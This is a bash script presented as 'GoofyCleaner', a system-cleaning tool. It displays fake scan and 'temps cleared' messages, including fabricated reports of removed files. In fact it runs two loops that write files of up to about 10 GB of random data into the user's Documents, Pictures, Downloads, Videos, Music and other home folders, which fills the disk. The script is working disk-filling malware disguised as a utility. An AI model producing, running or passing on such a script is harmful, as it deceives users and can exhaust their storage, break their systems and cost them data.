#! /bin/bash
echo "Welcome to the GoofyCleaner system cleaning tool"
sleep 2
echo "starting system scan..."
sleep 8
echo "Temps found. Starting clean."
sleep 2
echo "CLEARING TEMPS"
sleep 3
x=9999999999
for (( c=1; c<=15; c++ ))
do
 
cd ~/Public
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
cd ~
cd ~/Documents
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
cd ~
cd ~/Music
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
cd ~
cd ~/Videos
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x> $RANDOM.txt
cd ~
 

&> /dev/null
echo "[DEBUG] Detection ID:"$c " Successfully removed file '"$RANDOM".tmp'"
sleep $((RANDOM % 5))
done
echo "TEMPS CLEARED"

echo "Performing final filesystem scan. This may take up to 5 minutes."
for ((c=1;c<=99;c++))
do 
cd ~/Public
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
cd ~
cd ~/Documents
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
cd ~
cd ~/Music
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
cd ~
cd ~/Videos
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
cd ~
cd ~/Downloads
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
cd ~
cd ~/snap
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
cd ~
cd ~/Templates
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
cd ~
cd ~/Pictures
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt
cd ~
< /dev/urandom tr -dc "\t\n [:alnum:]" | head -c$x > $RANDOM.txt


&> /dev/null
 done
